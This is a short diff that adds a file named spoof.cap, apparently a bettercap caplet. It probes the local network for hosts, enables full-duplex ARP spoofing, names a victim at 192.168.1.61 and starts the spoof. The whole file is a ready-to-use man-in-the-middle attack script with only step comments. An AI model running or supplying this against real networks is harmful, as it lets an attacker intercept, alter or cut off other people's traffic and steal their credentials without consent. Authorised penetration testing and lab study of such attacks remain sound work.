@@ -1,0 +1,13 @@
+# File: spoof.cap
+
+# Discover hosts on the network.
+net.probe on
+
+# Set the ARP spoofer to be full-duplex.
+set arp.spoof.fullduplex true
+
+# Set the victim's IP address.
+set arp.spoof.targets 192.168.1.61
+
+# Turn on ARP spoofing.
+arp.spoof on
